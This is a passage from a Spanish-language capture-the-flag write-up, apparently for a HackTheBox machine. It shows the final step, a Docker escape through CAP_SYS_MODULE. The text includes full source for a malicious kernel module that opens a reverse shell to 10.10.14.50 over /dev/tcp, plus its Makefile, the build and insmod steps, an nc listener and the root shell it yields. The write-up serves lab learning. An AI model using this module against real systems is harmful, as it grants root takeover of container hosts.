Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```

Además, en el recurso que encontramos, nos explican como explotar ciertas `capablities` si estas estan habilitadas en el contenedor:

![image](https://user-images.githubusercontent.com/67548295/137583457-803fe8a8-0ab9-4a48-98d2-569aa5cbefcb.png)

Analizando las `capablilities` que estan habilitadas en el contenedor y comparandolas con las que aparecen en el artículo, me doy cuenta de que está habilitada la **CAP_SYS_MODULE**.

En el recurso se expone lo siguiente:

![image](https://user-images.githubusercontent.com/67548295/137583540-3d4fda83-da52-4641-ab6d-298a6a14e60d.png)

Se nos dice que si esta `capability` está habilitada, podremos crear un `modulo de kernel` que ejecute una **reverse shell** para poder acceder al sistema que sostiene el contenedor.

Bien, para hacer esto es muy sencillo.

Primero, creemos un **directorio de trabajo temporal** para trabajar más cómodamente:

```bash
root@1569c10115cc:~# cd `mktemp -d`
root@1569c10115cc:/tmp/tmp.aKlQEwETu0#
```
Bien, ahora copiemos este código y creemos un archivo. Recuerda cambiar la IP:

```bash
root@1569c10115cc:/tmp/tmp.aKlQEwETu0# cat reverse.c

#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("AAAAA");
MODULE_AUTHOR("AAAAAAAAAAAAAAAAAA");
MODULE_DESCRIPTION("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.50/4445 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
Vale, ahora tendremos que crear un archivo con nombre `Makefile` con el siguiente contenido:

```bash
obj-m +=reverse.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> El carácter en blanco antes de cada palabra 'make' en el Makefile debe ser una tabulación, ¡no espacios!

Ya una vez tengamos estos archivos creados **en el mismo directorio**, utilizaremos el comando `make` para **compilar el modulo**:

```bash
root@1569c10115cc:/tmp/tmp.aKlQEwETu0# ls -la 
total 20
drwx------ 2 root root 4096 Oct 16 10:46 .
drwxrwxrwt 1 root root 4096 Oct 16 10:18 ..
-rw-r--r-- 1 root root  156 Oct 16 10:45 Makefile
-rw-r--r-- 1 root root  736 Oct 16 10:36 reverse.c

root@1569c10115cc:/tmp/tmp.aKlQEwETu0# make
make -C /lib/modules/4.15.0-151-generic/build M=/tmp/tmp.aKlQEwETu0 modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
  CC [M]  /tmp/tmp.aKlQEwETu0/reverse.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/tmp.aKlQEwETu0/reverse.mod.o
  LD [M]  /tmp/tmp.aKlQEwETu0/reverse.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'
```
Ya hemos **compilado el modulo**.

Ahora nos pondremos en **escucha** por el puerto que hayamos especificado en el `modulo de kernel`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nc -lvnp 4445
Listening on 0.0.0.0 4445
```
Y ejecutaremos este comando en el contenedor de `docker`:

```bash
root@1569c10115cc:/tmp/tmp.aKlQEwETu0# insmod reverse.ko
```
Si hemos hecho todo bien, deberíamos de haber recibido una `shell` como usuario `root` en la máquina vìctima:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.10.238 40678
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# whoami
whoami
root
```
Una vez en este punto, ya podremos visualizar la flag `root.txt` en la ruta `/root/root.txt`:

```bash
root@monitors:/# cat /root/root.txt 
0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXd
```

# Conclusión

En esta máquina hemos abusado de un `LFI` a través de un **plugin vulnerable de WordPress** para leer archivos críticos y descubrir mas subdominios.
Para acceder a la máquina como usuario `www-data` explotamos una **versión vulnerable** del software `Cacti`.
Además, nos aprovechamos de una vulnerabilidad de `Insecure Deserialization` en un servidor web que se ejecutaba **internamente** en la máquina para acceder a un `contenedor de docker`.
Por último conseguimos **escapar del contenedor** y acceder a la máquina víctima como usuario `root` con ayuda de una `capability` que estaba habilitada en el contenedor que nos permitía crear un `modulo de kernel` malicioso.
